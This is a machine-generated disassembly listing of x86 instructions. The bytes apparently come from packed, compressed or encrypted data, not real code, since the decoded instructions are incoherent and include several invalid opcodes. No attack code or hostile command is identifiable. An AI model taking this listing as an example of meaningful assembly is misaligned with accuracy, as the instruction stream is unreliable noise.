  41750a:	28 ab 34 a9 f9 a7    	sub    %ch,-0x580656cc(%ebx)
  417510:	41                   	inc    %ecx
  417511:	70 6d                	jo     0x417580
  417513:	18 bc 96 81 0b 15 5a 	sbb    %bh,0x5a150b81(%esi,%edx,4)
  41751a:	b2 61                	mov    $0x61,%dl
  41751c:	1d ce 61 d7 c3       	sbb    $0xc3d761ce,%eax
  417521:	76 07                	jbe    0x41752a
  417523:	a1 35 9e ad b3       	mov    0xb3ad9e35,%eax
  417528:	81 9d 9c da 38 61 e7 	sbbl   $0x40597be7,0x6138da9c(%ebp)
  41752f:	7b 59 40 
  417532:	ad                   	lods   %ds:(%esi),%eax
  417533:	f7 b6 a9 04 37 25    	divl   0x253704a9(%esi)
  417539:	dc 2f                	fsubrl (%edi)
  41753b:	b9 a9 a9 ab a2       	mov    $0xa2aba9a9,%ecx
  417540:	90                   	nop
  417541:	d3 03                	roll   %cl,(%ebx)
  417543:	db da                	fcmovnu %st(2),%st
  417545:	29 a4 b7 6c 9d 90 0a 	sub    %esp,0xa909d6c(%edi,%esi,4)
  41754c:	5d                   	pop    %ebp
  41754d:	2c 61                	sub    $0x61,%al
  41754f:	3c 5f                	cmp    $0x5f,%al
  417551:	e1 0b                	loope  0x41755e
  417553:	3d ad 80 10 92       	cmp    $0x921080ad,%eax
  417558:	1c 5c                	sbb    $0x5c,%al
  41755a:	03 dd                	add    %ebp,%ebx
  41755c:	1d 92 71 f8 aa       	sbb    $0xaaf87192,%eax
  417561:	b2 b6                	mov    $0xb6,%dl
  417563:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  417564:	85 59 c6             	test   %ebx,-0x3a(%ecx)
  417567:	3c 05                	cmp    $0x5,%al
  417569:	9b                   	fwait
  41756a:	ec                   	in     (%dx),%al
  41756b:	3d 73 a8 3e 30       	cmp    $0x303ea873,%eax
  417570:	aa                   	stos   %al,%es:(%edi)
  417571:	1f                   	pop    %ds
  417572:	33 d7                	xor    %edi,%edx
  417574:	66 4c                	dec    %sp
  417576:	51                   	push   %ecx
  417577:	3e af                	ds scas %es:(%edi),%eax
  417579:	42                   	inc    %edx
  41757a:	bd 4a 4d 07 c6       	mov    $0xc6074d4a,%ebp
  41757f:	bc bc 48 b2 b6       	mov    $0xb6b248bc,%esp
  417584:	b8 00 5b 10 5a       	mov    $0x5a105b00,%eax
  417589:	10 44 3f 2b          	adc    %al,0x2b(%edi,%edi,1)
  41758d:	7d a7                	jge    0x417536
  41758f:	98                   	cwtl
  417590:	b5 d6                	mov    $0xd6,%ch
  417592:	66 11 fc             	adc    %di,%sp
  417595:	ee                   	out    %al,(%dx)
  417596:	94                   	xchg   %eax,%esp
  417597:	c1 dc b6             	rcr    $0xb6,%esp
  41759a:	60                   	pusha
  41759b:	5a                   	pop    %edx
  41759c:	1c bc                	sbb    $0xbc,%al
  41759e:	d8 05 ab 53 a8 18    	fadds  0x18a853ab
  4175a4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4175a5:	cd 75                	int    $0x75
  4175a7:	c3                   	ret
  4175a8:	a0 13 b2 41 d3       	mov    0xd341b213,%al
  4175ad:	b2 6f                	mov    $0x6f,%dl
  4175af:	1e                   	push   %ds
  4175b0:	a1 d0 0e b2 c1       	mov    0xc1b20ed0,%eax
  4175b5:	92                   	xchg   %eax,%edx
  4175b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4175b7:	b7 bd                	mov    $0xbd,%bh
  4175b9:	b2 d2                	mov    $0xd2,%dl
  4175bb:	61                   	popa
  4175bc:	21 3d 48 af f0 c5    	and    %edi,0xc5f0af48
  4175c2:	60                   	pusha
  4175c3:	0f df df             	pandn  %mm7,%mm3
  4175c6:	ab                   	stos   %eax,%es:(%edi)
  4175c7:	05 bc 95 99 0d       	add    $0xd9995bc,%eax
  4175cc:	84 58 91             	test   %bl,-0x6f(%eax)
  4175cf:	8e 9a b9 58 b7 80    	mov    -0x7f48a747(%edx),%ds
  4175d5:	bd b1 50 44 90       	mov    $0x904450b1,%ebp
  4175da:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4175db:	46                   	inc    %esi
  4175dc:	c1 5d 9a a9          	rcrl   $0xa9,-0x66(%ebp)
  4175e0:	b4 74                	mov    $0x74,%ah
  4175e2:	50                   	push   %eax
  4175e3:	55                   	push   %ebp
  4175e4:	a2 d6 10 92 6d       	mov    %al,0x6d9210d6
  4175e9:	ed                   	in     (%dx),%eax
  4175ea:	ad                   	lods   %ds:(%esi),%eax
  4175eb:	5a                   	pop    %edx
  4175ec:	5a                   	pop    %edx
  4175ed:	67 30 06 36 23       	xor    %al,0x2336
  4175f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4175f3:	08 5f bc             	or     %bl,-0x44(%edi)
  4175f6:	64 8f c6             	fs pop %esi
  4175f9:	da 61 0c             	fisubl 0xc(%ecx)
  4175fc:	49                   	dec    %ecx
  4175fd:	75 58                	jne    0x417657
  4175ff:	ae                   	scas   %es:(%edi),%al
  417600:	65 ab                	gs stos %eax,%es:(%edi)
  417602:	a0 0f b4 b3 65       	mov    0x65b3b40f,%al
  417607:	b1 80                	mov    $0x80,%cl
  417609:	43                   	inc    %ebx
  41760a:	83 33 8d             	xorl   $0xffffff8d,(%ebx)
  41760d:	ac                   	lods   %ds:(%esi),%al
  41760e:	f4                   	hlt
  41760f:	0a 0f                	or     (%edi),%cl
  417611:	09 ba eb 12 3a 52    	or     %edi,0x523a12eb(%edx)
  417617:	66 6d                	insw   (%dx),%es:(%edi)
  417619:	c1 b8 bb 3c 13 a5 e1 	sarl   $0xe1,-0x5aecc345(%eax)
  417620:	08 18                	or     %bl,(%eax)
  417622:	0e                   	push   %cs
  417623:	e7 b4                	out    %eax,$0xb4
  417625:	b1 b8                	mov    $0xb8,%cl
  417627:	60                   	pusha
  417628:	18 82 fb c1 4a b8    	sbb    %al,-0x47b53e05(%edx)
  41762e:	a8 b7                	test   $0xb7,%al
  417630:	91                   	xchg   %eax,%ecx
  417631:	97                   	xchg   %eax,%edi
  417632:	12 43 53             	adc    0x53(%ebx),%al
  417635:	83 82 cd df 1c 79 d9 	addl   $0xffffffd9,0x791cdfcd(%edx)
  41763c:	64 24 e4             	fs and $0xe4,%al
  41763f:	81 63 a8 5f 8c f7 70 	andl   $0x70f78c5f,-0x58(%ebx)
  417646:	b7 a0                	mov    $0xa0,%bh
  417648:	ba 9b 16 9b ac       	mov    $0xac9b169b,%edx
  41764d:	93                   	xchg   %eax,%ebx
  41764e:	18 c3                	sbb    %al,%bl
  417650:	9a 91 8f 40 92 04 92 	lcall  $0x9204,$0x92408f91
  417657:	31 63 1a             	xor    %esp,0x1a(%ebx)
  41765a:	77 f8                	ja     0x417654
  41765c:	65 b7 da             	gs mov $0xda,%bh
  41765f:	16                   	push   %ss
  417660:	b2 bb                	mov    $0xbb,%dl
  417662:	34 97                	xor    $0x97,%al
  417664:	95                   	xchg   %eax,%ebp
  417665:	9a d1 ab dd 6e b3 73 	lcall  $0x73b3,$0x6eddabd1
  41766c:	0a ad 91 3d b3 ae    	or     -0x514cc26f(%ebp),%ch
  417672:	08 8c d2 13 0a 23 2c 	or     %cl,0x2c230a13(%edx,%edx,8)
  417679:	f0 a8 b4             	lock test $0xb4,%al
  41767c:	b3 02                	mov    $0x2,%bl
  41767e:	96                   	xchg   %eax,%esi
  41767f:	90                   	nop
  417680:	02 af 0c 4d 1a d2    	add    -0x2de5b2f4(%edi),%ch
  417686:	92                   	xchg   %eax,%edx
  417687:	ac                   	lods   %ds:(%esi),%al
  417688:	a8 a4                	test   $0xa4,%al
  41768a:	63 08                	arpl   %ecx,(%eax)
  41768c:	74 83                	je     0x417611
  41768e:	7e a7                	jle    0x417637
  417690:	4d                   	dec    %ebp
  417691:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  417692:	5c                   	pop    %esp
  417693:	1c 1a                	sbb    $0x1a,%al
  417695:	cf                   	iret
  417696:	5a                   	pop    %edx
  417697:	37                   	aaa
  417698:	8d ad d1 0b ab ac    	lea    -0x5354f42f(%ebp),%ebp
  41769e:	5f                   	pop    %edi
  41769f:	42                   	inc    %edx
  4176a0:	b0 df                	mov    $0xdf,%al
  4176a2:	ce                   	into
  4176a3:	74 b1                	je     0x417656
  4176a5:	1e                   	push   %ds
  4176a6:	b2 ac                	mov    $0xac,%dl
  4176a8:	a8 b0                	test   $0xb0,%al
  4176aa:	b6 0c                	mov    $0xc,%dh
  4176ac:	f3 6b 6d 58 81       	repz imul $0xffffff81,0x58(%ebp),%ebp
  4176b1:	d7                   	xlat   %ds:(%ebx)
  4176b2:	23 5f 0b             	and    0xb(%edi),%ebx
  4176b5:	4d                   	dec    %ebp
  4176b6:	e3 31                	jecxz  0x4176e9
  4176b8:	0b 58 0c             	or     0xc(%eax),%ebx
  4176bb:	18 1f                	sbb    %bl,(%edi)
  4176bd:	c7 84 c7 7b 0f a7 b6 	movl   $0xd9520b0d,-0x4958f085(%edi,%eax,8)
  4176c4:	0d 0b 52 d9 
  4176c8:	ec                   	in     (%dx),%al
  4176c9:	82 e9 91             	sub    $0x91,%cl
  4176cc:	1f                   	pop    %ds
  4176cd:	63 fc                	arpl   %edi,%esp
  4176cf:	a9 a8 57 5b d6       	test   $0xd65b57a8,%eax
  4176d4:	ec                   	in     (%dx),%al
  4176d5:	10 0b                	adc    %cl,(%ebx)
  4176d7:	1a 61 0f             	sbb    0xf(%ecx),%ah
  4176da:	67 87 f4             	addr16 xchg %esi,%esp
  4176dd:	35 0a bc c2 bb       	xor    $0xbbc2bc0a,%eax
  4176e2:	4a                   	dec    %edx
  4176e3:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4176e4:	21 1d 0f 1e 6f 2e    	and    %ebx,0x2e6f1e0f
  4176ea:	2b b4 ed d9 12 de 97 	sub    -0x6821ed27(%ebp,%ebp,8),%esi
  4176f1:	0c de                	or     $0xde,%al
  4176f3:	29 b7 97 62 12 12    	sub    %esi,0x12126297(%edi)
  4176f9:	ee                   	out    %al,(%dx)
  4176fa:	8c ad 18 ae 09 3a    	mov    %gs,0x3a09ae18(%ebp)
  417700:	cb                   	lret
  417701:	48                   	dec    %eax
  417702:	c2 10 c7             	ret    $0xc710
  417705:	d3 ea                	shr    %cl,%edx
  417707:	08 18                	or     %bl,(%eax)
  417709:	1c 12                	sbb    $0x12,%al
  41770b:	98                   	cwtl
  41770c:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  41770d:	ec                   	in     (%dx),%al
  41770e:	1b 98 6d 50 d9 41    	sbb    0x41d9506d(%eax),%ebx
  417714:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  417715:	e3 4f                	jecxz  0x417766
  417717:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  417718:	ba 30 96 f1 30       	mov    $0x30f19630,%edx
  41771d:	2a 26                	sub    (%esi),%ah
  41771f:	22 40 78             	and    0x78(%eax),%al
  417722:	48                   	dec    %eax
  417723:	42                   	inc    %edx
  417724:	d9 cb                	fxch   %st(3)
  417726:	b7 d0                	mov    $0xd0,%bh
  417728:	e1 94                	loope  0x4176be
  41772a:	ac                   	lods   %ds:(%esi),%al
  41772b:	c3                   	ret
  41772c:	73 10                	jae    0x41773e
  41772e:	3f                   	aas
  41772f:	00 61 6b             	add    %ah,0x6b(%ecx)
  417732:	98                   	cwtl
  417733:	dc 46 0a             	faddl  0xa(%esi)
  417736:	b3 d1                	mov    $0xd1,%bl
  417738:	b8 9b a1 b4 32       	mov    $0x32b4a19b,%eax
  41773d:	0e                   	push   %cs
  41773e:	aa                   	stos   %al,%es:(%edi)
  41773f:	94                   	xchg   %eax,%esp
  417740:	f2 48                	repnz dec %eax
  417742:	06                   	push   %es
  417743:	c2 e5 9b             	ret    $0x9be5
  417746:	33 ba ad b6 91 b0    	xor    -0x4f6e4953(%edx),%edi
  41774c:	b4 5d                	mov    $0x5d,%ah
  41774e:	41                   	inc    %ecx
  41774f:	08 c2                	or     %al,%dl
  417751:	10 59 50             	adc    %bl,0x50(%ecx)
  417754:	4c                   	dec    %esp
  417755:	dc 23                	fsubl  (%ebx)
  417757:	08 0f                	or     %cl,(%edi)
  417759:	48                   	dec    %eax
  41775a:	bb 3d 7b 9f 24       	mov    $0x249f7b3d,%ebx
  41775f:	9c                   	pushf
  417760:	6d                   	insl   (%dx),%es:(%edi)
  417761:	05 51 0f b8 c4       	add    $0xc4b80f51,%eax
  417766:	b6 30                	mov    $0x30,%dh
  417768:	b0 88                	mov    $0x88,%al
  41776a:	30 84 22 1e 89 21 0c 	xor    %al,0xc21891e(%edx,%eiz,1)
  417771:	21 c2                	and    %eax,%edx
  417773:	0d 09 05 12 96       	or     $0x96120509,%eax
  417778:	69 8b 26 a5 8f d4 d6 	imul   $0xae060d6,-0x2b705ada(%ebx),%ecx
  41777f:	60 e0 0a 
  417782:	e0 af                	loopne 0x417733
  417784:	b4 2c                	mov    $0x2c,%ah
  417786:	c0 d6 a0             	rcl    $0xa0,%dh
  417789:	5d                   	pop    %ebp
  41778a:	a9 57 d2 ea ad       	test   $0xadead257,%eax
  41778f:	58                   	pop    %eax
  417790:	02 c3                	add    %bl,%al
  417792:	a2 05 8f 26 3a       	mov    %al,0x3a268f05
  417797:	ec                   	in     (%dx),%al
  417798:	b0 77                	mov    $0x77,%al
  41779a:	12 08                	adc    (%eax),%cl
  41779c:	92                   	xchg   %eax,%edx
  41779d:	9b                   	fwait
  41779e:	0c b2                	or     $0xb2,%al
  4177a0:	ad                   	lods   %ds:(%esi),%eax
  4177a1:	c9                   	leave
  4177a2:	68 c9 d0 0c 33       	push   $0x330cd0c9
  4177a7:	b2 66                	mov    $0x66,%dl
  4177a9:	b7 06                	mov    $0x6,%bh
  4177ab:	46                   	inc    %esi
  4177ac:	42                   	inc    %edx
  4177ad:	2b b1 bb e0 b0 9d    	sub    -0x624f1f45(%ecx),%esi
  4177b3:	bd 82 29 09 8f       	mov    $0x8f092982,%ebp
  4177b8:	3b 39                	cmp    (%ecx),%edi
  4177ba:	31 bc 60 c9 92 52 4e 	xor    %edi,0x4e5292c9(%eax,%eiz,2)
  4177c1:	4a                   	dec    %edx
  4177c2:	46                   	inc    %esi
  4177c3:	19 5e 8c             	sbb    %ebx,-0x74(%esi)
  4177c6:	24 5a                	and    $0x5a,%al
  4177c8:	45                   	inc    %ebp
  4177c9:	45                   	inc    %ebp
  4177ca:	00 2f                	add    %ch,(%edi)
  4177cc:	48                   	dec    %eax
  4177cd:	43                   	inc    %ebx
  4177ce:	e0 06                	loopne 0x4177d6
  4177d0:	10 cb                	adc    %cl,%bl
  4177d2:	63 63 25             	arpl   %esp,0x25(%ebx)
  4177d5:	b0 64                	mov    $0x64,%al
  4177d7:	51                   	push   %ecx
  4177d8:	cd 9f                	int    $0x9f
  4177da:	90                   	nop
  4177db:	e4 96                	in     $0x96,%al
  4177dd:	38 2c b4             	cmp    %ch,(%esp,%esi,4)
  4177e0:	b0 62                	mov    $0x62,%al
  4177e2:	91                   	xchg   %eax,%ecx
  4177e3:	72 01                	jb     0x4177e6
  4177e5:	97                   	xchg   %eax,%edi
  4177e6:	84 21                	test   %ah,(%ecx)
  4177e8:	98                   	cwtl
  4177e9:	9e                   	sahf
  4177ea:	10 49 9a             	adc    %cl,-0x66(%ecx)
  4177ed:	41                   	inc    %ecx
  4177ee:	2c c3                	sub    $0xc3,%al
  4177f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4177f1:	e2 86                	loop   0x417779
  4177f3:	32 58 08             	xor    0x8(%eax),%bl
  4177f6:	c9                   	leave
  4177f7:	c3                   	ret
  4177f8:	e6 e0                	out    %al,$0xe0
  4177fa:	91                   	xchg   %eax,%ecx
  4177fb:	42                   	inc    %edx
  4177fc:	62 d9 82             	(bad) {ru-bad},{%k6}{z}
  4177ff:	de 3d f4 d1 6e cb    	fidivrs 0xcb6ed1f4
  417805:	b1 a9                	mov    $0xa9,%cl
  417807:	cd 7e                	int    $0x7e
  417809:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41780a:	dc a5 14 3a 99 af    	fsubl  -0x5066c5ec(%ebp)
  417810:	16                   	push   %ss
  417811:	06                   	push   %es
  417812:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  417813:	9a 57 ca e8 40 68 26 	lcall  $0x2668,$0x40e8ca57
  41781a:	5c                   	pop    %esp
  41781b:	9c                   	pushf
  41781c:	5d                   	pop    %ebp
  41781d:	8d b0 88 40 1c 24    	lea    0x241c4088(%eax),%esi
  417823:	65 34 2b             	gs xor $0x2b,%al
  417826:	19 71 c6             	sbb    %esi,-0x3a(%ecx)
  417829:	b2 4a                	mov    $0x4a,%dl
  41782b:	58                   	pop    %eax
  41782c:	c3                   	ret
  41782d:	68 66 66 06 1b       	push   $0x1b066666
  417832:	86 4b 34             	xchg   %cl,0x34(%ebx)
  417835:	b7 e3                	mov    $0xe3,%bh
  417837:	8b b7 07 a4 47 c9    	mov    -0x36b85bf9(%edi),%esi
  41783d:	22 4c 8b da          	and    -0x26(%ebx,%ecx,4),%cl
  417841:	2c cc                	sub    $0xcc,%al
  417843:	92                   	xchg   %eax,%edx
  417844:	c5 45 4b             	lds    0x4b(%ebp),%eax
  417847:	2b a9 39 5e ee 0f    	sub    0xfee5e39(%ecx),%ebp
  41784d:	06                   	push   %es
  41784e:	bb ab aa a9 06       	mov    $0x6a9aaab,%ebx
  417853:	e4 e4                	in     $0xe4,%al
  417855:	75 05                	jne    0x41785c
  417857:	47                   	inc    %edi
  417858:	cc                   	int3
  417859:	5e                   	pop    %esi
  41785a:	e0 6f                	loopne 0x4178cb
  41785c:	5e                   	pop    %esi
  41785d:	2f                   	das
  41785e:	90                   	nop
  41785f:	c7                   	(bad)
  417860:	30 5a c1             	xor    %bl,-0x3f(%edx)
  417863:	10 9c d8 97 d4 cc e8 	adc    %bl,-0x17332b69(%eax,%ebx,8)
  41786a:	38 89 d8 ba 99 c3    	cmp    %cl,-0x3c664528(%ecx)
  417870:	7c 2c                	jl     0x41789e
  417872:	08 11                	or     %dl,(%ecx)
  417874:	26 6c                	es insb (%dx),%es:(%edi)
  417876:	44                   	inc    %esp
  417877:	97                   	xchg   %eax,%edi
  417878:	61                   	popa
  417879:	4a                   	dec    %edx
  41787a:	29 a9 c3 9a 37 69    	sub    %ebp,0x69379ac3(%ecx)
  417880:	41                   	inc    %ecx
  417881:	10 78 d1             	adc    %bh,-0x2f(%eax)
  417884:	60                   	pusha
  417885:	47                   	inc    %edi
  417886:	3d 18 1c 9a 98       	cmp    $0x989a1c18,%eax
  41788b:	38 87 b7 98 31 69    	cmp    %al,0x693198b7(%edi)
  417891:	06                   	push   %es
  417892:	c9                   	leave
  417893:	60                   	pusha
  417894:	2d 23 8a 0c 81       	sub    $0x810c8a23,%eax
  417899:	60                   	pusha
  41789a:	25 db 2b 02 49       	and    $0x49022bdb,%eax
  41789f:	20 08                	and    %cl,(%eax)
  4178a1:	27                   	daa
  4178a2:	23 1f                	and    (%edi),%ebx
  4178a4:	21 58 12             	and    %ebx,0x12(%eax)
  4178a7:	18 1b                	sbb    %bl,(%ebx)
  4178a9:	08 ce                	or     %cl,%dh
  4178ab:	22 60 cd             	and    -0x33(%eax),%ah
  4178ae:	30 db                	xor    %bl,%bl
  4178b0:	ca b0 5a             	lret   $0x5ab0
  4178b3:	c2 09 cb             	ret    $0xcb09
  4178b6:	11 2a                	adc    %ebp,(%edx)
  4178b8:	b8 95 6b d2 60       	mov    $0x60d26b95,%eax
  4178bd:	49                   	dec    %ecx
  4178be:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4178bf:	0d a7 1a f1 d8       	or     $0xd8f11aa7,%eax
  4178c4:	1a 3a                	sbb    (%edx),%bh
  4178c6:	0c 15                	or     $0x15,%al
  4178c8:	64 b1 55             	fs mov $0x55,%cl
  4178cb:	a8 a4                	test   $0xa4,%al
  4178cd:	66 d8 46 15          	data16 fadds 0x15(%esi)
  4178d1:	b8 d4 af da 25       	mov    $0x25daafd4,%eax
  4178d6:	67 24 5c             	addr16 and $0x5c,%al
  4178d9:	cb                   	lret
  4178da:	5a                   	pop    %edx
  4178db:	02 6e 8b             	add    -0x75(%esi),%ch
  4178de:	f1                   	int1
  4178df:	58                   	pop    %eax
  4178e0:	1c 88                	sbb    $0x88,%al
  4178e2:	96                   	xchg   %eax,%esi
  4178e3:	11 49 58             	adc    %ecx,0x58(%ecx)
  4178e6:	ac                   	lods   %ds:(%esi),%al
  4178e7:	e6 22                	out    %al,$0x22
  4178e9:	36 b3 6d             	ss mov $0x6d,%bl
  4178ec:	ef                   	out    %eax,(%dx)
  4178ed:	0b 86 3a 43 33 36    	or     0x3633433a(%esi),%eax
  4178f3:	11 a8 ad c9 ec b6    	adc    %ebp,-0x49133653(%eax)
  4178f9:	06                   	push   %es
  4178fa:	43                   	inc    %ebx
  4178fb:	7b ae                	jnp    0x4178ab
  4178fd:	14 fd                	adc    $0xfd,%al
  4178ff:	c2 48 24             	ret    $0x2448
  417902:	46                   	inc    %esi
  417903:	01 a1 08 73 14 e3    	add    %esp,-0x1ceb8cf8(%ecx)
  417909:	9a d1 30 0a 96 df 92 	lcall  $0x92df,$0x960a30d1
  417910:	98                   	cwtl
  417911:	51                   	push   %ecx
  417912:	32 db                	xor    %bl,%bl
  417914:	d7                   	xlat   %ds:(%ebx)
  417915:	f9                   	stc
  417916:	35 a4 92 51 d2       	xor    $0xd25192a4,%eax
  41791b:	f1                   	int1
  41791c:	20 95 8c 24 ed 24    	and    %dl,0x24ed248c(%ebp)
  417922:	f2 a4                	repnz movsb %ds:(%esi),%es:(%edi)
  417924:	92                   	xchg   %eax,%edx
  417925:	d4 a9                	aam    $0xa9
  417927:	a9 e6 e2 34 a3       	test   $0xa334e2e6,%eax
  41792c:	08 90 06 51 24 24    	or     %dl,0x24245106(%eax)
  417932:	8b 65 47             	mov    0x47(%ebp),%esp
  417935:	7b a1                	jnp    0x4178d8
  417937:	69 18 0d a3 48 44    	imul   $0x4448a30d,(%eax),%ebx
  41793d:	5f                   	pop    %edi
  41793e:	82 94 8c 37 53 cb 7f 	adcb   $0xc,0x7fcb5337(%esp,%ecx,4)
  417945:	0c 
  417946:	92                   	xchg   %eax,%edx
  417947:	94                   	xchg   %eax,%esp
  417948:	ac                   	lods   %ds:(%esi),%al
  417949:	87 be 18 50 8c 92    	xchg   %edi,-0x6d73afe8(%esi)
  41794f:	91                   	xchg   %eax,%ecx
  417950:	e8 07 6a 02 24       	call   0x2443e35c
  417955:	eb 8e                	jmp    0x4178e5
  417957:	c5 4d 04             	lds    0x4(%ebp),%ecx
  41795a:	88 00                	mov    %al,(%eax)
  41795c:	c3                   	ret
  41795d:	55                   	push   %ebp
  41795e:	45                   	inc    %ebp
  41795f:	41                   	inc    %ecx
  417960:	31 01                	xor    %eax,(%ecx)
  417962:	26 90                	es nop
  417964:	24 31                	and    $0x31,%al
  417966:	98                   	cwtl
  417967:	30 8c 61 a2 ec c3 02 	xor    %cl,0x2c3eca2(%ecx,%eiz,2)
  41796e:	02 6f f6             	add    -0xa(%edi),%ch
  417971:	f0 0a c1             	lock or %cl,%al
  417974:	dd 92 f4 92 f1 0a    	fstl   0xaf192f4(%edx)
  41797a:	f9                   	stc
  41797b:	0c d4                	or     $0xd4,%al
  41797d:	d4 61                	aam    $0x61
  41797f:	10 8c 7a 7a a5 61 49 	adc    %cl,0x4961a57a(%edx,%edi,2)
  417986:	80 80 d3 e7 09 25 34 	addb   $0x34,0x2509e7d3(%eax)
  41798d:	6c                   	insb   (%dx),%es:(%edi)
  41798e:	d9 a5 0a 33 b5 1a    	fldenv 0x1ab5330a(%ebp)
  417994:	06                   	push   %es
  417995:	2b a1 4c 7c 46 85    	sub    -0x7ab983b4(%ecx),%esp
  41799b:	47                   	inc    %edi
  41799c:	30 8f 0c 27 85 4a    	xor    %cl,0x4a85270c(%edi)
  4179a2:	c6                   	(bad)
  4179a3:	0c 18                	or     $0x18,%al
  4179a5:	4c                   	dec    %esp
  4179a6:	3c 30                	cmp    $0x30,%al
  4179a8:	82 d4 12             	adc    $0x12,%ah
  4179ab:	f4                   	hlt
  4179ac:	2d 0a d1 90 8a       	sub    $0x8a90d10a,%eax
  4179b1:	d4 14                	aam    $0x14
  4179b3:	10 16                	adc    %dl,(%esi)
  4179b5:	06                   	push   %es
  4179b6:	b3 82                	mov    $0x82,%bl
  4179b8:	ff 47 2d             	incl   0x2d(%edi)
  4179bb:	a3 64 14 8c fc       	mov    %eax,0xfc8c1464
  4179c0:	f8                   	clc
  4179c1:	e2 30                	loop   0x4179f3
  4179c3:	20 19                	and    %bl,(%ecx)
  4179c5:	25 d4 3a b4 32       	and    $0x32b43ad4,%eax
  4179ca:	7a 11                	jp     0x4179dd
  4179cc:	eb e0                	jmp    0x4179ae
  4179ce:	19 05 6b 60 9d 6c    	sbb    %eax,0x6c9d606b
  4179d4:	7b 4a                	jnp    0x417a20
  4179d6:	56                   	push   %esi
  4179d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4179d8:	c2 90 9a             	ret    $0x9a90
  4179db:	05 86 9a 9d 5e       	add    $0x5e9d9a86,%eax
  4179e0:	c8 40 d7 2e          	enter  $0xd740,$0x2e
  4179e4:	e0 80                	loopne 0x417966
  4179e6:	84 00                	test   %al,(%eax)
  4179e8:	4b                   	dec    %ebx
  4179e9:	32 68 0c             	xor    0xc(%eax),%ch
  4179ec:	1b c6                	sbb    %esi,%eax
  4179ee:	c0 a5 e5 db 60 23 a1 	shlb   $0xa1,0x2360dbe5(%ebp)
  4179f5:	06                   	push   %es
  4179f6:	25 e0 e0 5b 46       	and    $0x465be0e0,%eax
  4179fb:	0c 18                	or     $0x18,%al
  4179fd:	80 fe d3             	cmp    $0xd3,%dh
  417a00:	c9                   	leave
  417a01:	68 c3 44 9e 8f       	push   $0x8f9e44c3
  417a06:	99                   	cltd
  417a07:	f7 f5                	div    %ebp
  417a09:	22 1c 46             	and    (%esi,%eax,2),%bl
  417a0c:	de 90 7d ca 8a d5    	ficoms -0x2a753583(%eax)
  417a12:	84 22                	test   %ah,(%edx)
  417a14:	04 1b                	add    $0x1b,%al
  417a16:	0a 92 16 52 4b bc    	or     -0x43b4adea(%edx),%dl
  417a1c:	ff c1                	inc    %ecx
  417a1e:	21 90 a4 37 0f c5    	and    %edx,-0x3af0c85c(%eax)
  417a24:	11 0d e9 05 29 c9    	adc    %ecx,0xc92905e9
  417a2a:	13 cd                	adc    %ebp,%ecx
  417a2c:	06                   	push   %es
  417a2d:	02 0c e9             	add    (%ecx,%ebp,8),%cl
  417a30:	0b d1                	or     %ecx,%edx
  417a32:	18 b0 2c 37 24 5d    	sbb    %dh,0x5d24372c(%eax)
  417a38:	96                   	xchg   %eax,%esi
  417a39:	75 06                	jne    0x417a41
  417a3b:	0c 83                	or     $0x83,%al
  417a3d:	60                   	pusha
  417a3e:	2a 26                	sub    (%esi),%ah
  417a40:	40                   	inc    %eax
  417a41:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  417a42:	26 0d 1b 08 5d 08    	es or  $0x85d081b,%eax
  417a48:	12 b1 86 b4 61 2a    	adc    0x2a61b486(%ecx),%dh
  417a4e:	ab                   	stos   %eax,%es:(%edi)
  417a4f:	20 10                	and    %dl,(%eax)
  417a51:	10 4a 32             	adc    %cl,0x32(%edx)
  417a54:	83 24 40 32          	andl   $0x32,(%eax,%eax,2)
  417a58:	60                   	pusha
  417a59:	16                   	push   %ss
  417a5a:	df 61 c1             	fbld   -0x3f(%ecx)
  417a5d:	40                   	inc    %eax
  417a5e:	82 e3 e4             	and    $0xe4,%bl
  417a61:	20 20                	and    %ah,(%eax)
  417a63:	31 29                	xor    %ebp,(%ecx)
  417a65:	71 06                	jno    0x417a6d
  417a67:	0c 82                	or     $0x82,%al
  417a69:	95                   	xchg   %eax,%ebp
  417a6a:	b2 fa                	mov    $0xfa,%dl
  417a6c:	15 cd c2 b0 25       	adc    $0x25b0c2cd,%eax
  417a71:	94                   	xchg   %eax,%esp
  417a72:	63 dd                	arpl   %ebx,%ebp
  417a74:	50                   	push   %eax
  417a75:	08 90 2c 58 30 bb    	or     %dl,-0x44cfa7d4(%eax)
  417a7b:	82 64 2d 63 dd       	andb   $0xdd,0x63(%ebp,%ebp,1)
  417a80:	75 4c                	jne    0x417ace
  417a82:	62 16                	bound  %edx,(%esi)
  417a84:	cc                   	int3
  417a85:	35 31 89 c5 92       	xor    $0x92c58931,%eax
  417a8a:	1a 12                	sbb    (%edx),%dl
  417a8c:	fe                   	(bad)
  417a8d:	f8                   	clc
  417a8e:	61                   	popa
  417a8f:	f2 26 96             	repnz es xchg %eax,%esi
  417a92:	24 88                	and    $0x88,%al
  417a94:	b7 ac                	mov    $0xac,%bh
  417a96:	ad                   	lods   %ds:(%esi),%eax
  417a97:	a9 f5 21 f3 20       	test   $0x20f321f5,%eax
  417a9c:	24 95                	and    $0x95,%al
  417a9e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  417a9f:	ab                   	stos   %eax,%es:(%edi)
  417aa0:	b2 42                	mov    $0x42,%dl
  417aa2:	92                   	xchg   %eax,%edx
  417aa3:	18 c6                	sbb    %al,%dh
  417aa5:	02 dc                	add    %ah,%bl
  417aa7:	04 40                	add    $0x40,%al
  417aa9:	b2 81                	mov    $0x81,%dl
  417aab:	41                   	inc    %ecx
  417aac:	e7 3b                	out    %eax,$0x3b
  417aae:	42                   	inc    %edx
  417aaf:	04 a4                	add    $0xa4,%al
  417ab1:	92                   	xchg   %eax,%edx
  417ab2:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  417ab3:	08 17                	or     %dl,(%edi)
  417ab5:	32 de                	xor    %dh,%bl
